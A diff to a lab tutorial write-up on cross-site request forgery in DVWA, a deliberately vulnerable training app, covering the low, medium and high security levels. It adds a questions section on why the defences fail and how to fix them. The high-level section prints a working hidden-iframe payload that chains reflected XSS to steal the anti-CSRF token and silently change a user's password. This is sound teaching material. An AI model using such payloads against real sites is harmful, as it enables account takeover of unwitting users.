@@ -1,8 +1,10 @@
-# Cross-site request forgery vulnerabilities in DVWA
+# Tutorial 9: Client-Side Web Vulnerabilities (Part 2)
+
+## Cross-site request forgery vulnerabilities in DVWA
 
 Our goal is to exploit the vulnerabilities in the **CSRF** category of `dvwa`. We want to create a website that, if the user visits, will change their password to the current security level without their knowledge or permission.
 
-*Security Level: low*
+#### *Security Level: low*
 
 To first figure out how to perform a CSRF attack, we need to see how the password is actually changed. In our network view, we see the following GET request is made:
 ```
@@ -25,7 +27,7 @@ My first instinct was to use the `fetch()` function like in tutorial 7. However,
 
 After opening up the payload in our browser, when we try to log back in we can see that the password has changed.
 
-*Security Level: medium*
+#### *Security Level: medium*
 
 In this level, the following check has been added:
 ```PHP
@@ -36,7 +38,7 @@ if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ])!=-1 )
 
 This means that this difficulty is effectively the same as the previous level, and the exact same payyload can be used.
 
-*Security Level: high*
+#### *Security Level: high*
 
 In this level, the following check is used instead:
 ```PHP
@@ -84,4 +86,11 @@ I first tested this by opening this link in a new tab, which caused my password 
 <iframe src="http://10.6.66.42/dvwa/vulnerabilities/xss_r/?name=%3Ciframe+id%3D%22csrf_vuln%22+src%3D%22http%3A%2F%2F10.6.66.42%2Fdvwa%2Fvulnerabilities%2Fcsrf%2F%22+style%3D%22visibility%3A+hidden%3B%22+onload%3D%22var+iframe+%3D+document.getElementById(%27csrf_vuln%27)%3B%0A+var+doc+%3D+iframe.contentWindow.document%3B+var+token+%3D+doc.getElementsByName(%27user_token%27)%5B0%5D.value%3B+const+http+%3D+new+XMLHttpRequest()%3B+const+url+%3D+%27http%3A%2F%2F10.6.66.42%2Fdvwa%2Fvulnerabilities%2Fcsrf%2F%3Fpassword_new%3Dhigh%26password_conf%3Dhigh%26Change%3DChange%26user_token%3D%27%2Btoken%3B+http.open(%27GET%27%2C+url)%3B+http.send()%3B%22%3E%3C%2Fiframe%3E", style="visibility: hidden;">
 </iframe>
 ```
-Another option is to redirect our user to the payload url using a `<meta>` tag in the header, but this means that the user can see that they've been redirected, which might be a little *sus*. If we now open our [evil webpage](high.html), all the relevent network requests are made, with our XXS attack triggering a CSRF attack which sets the user's password to 'high'! 
+Another option is to redirect our user to the payload url using a `<meta>` tag in the header, but this means that the user can see that they've been redirected, which might be a little *sus*. If we now open our [evil webpage](high.html), all the relevent network requests are made, with our XXS attack triggering a CSRF attack which sets the user's password to 'high'!
+
+## Questions
+1. In the *easy* difficulty, there is no attempt to prevent CSRF. The attempts to prevent if in the other levels are on line 5:
+  - *Medium level:* The faulty if-statement was covered in it's section. However, if it worked as intended it could still easily be bypassed (e.g. with the use of an iframe). Furthermore, the server name could appear anywhere in the referring url, and doesn't even need to be the origin to bypass the filter.
+  - *High level:* The anti-CSRF token is static and per-user, allowing it to be stolen (using another exploit in DVWA) and reused in a CSRF exploit at any later time.
+
+2. These vulnerabilites could be solved with the correct implementation of an anti-CSRF token, or requiring the user to correctly supply some authenticating information (e.g. their current password) before performing the password change.
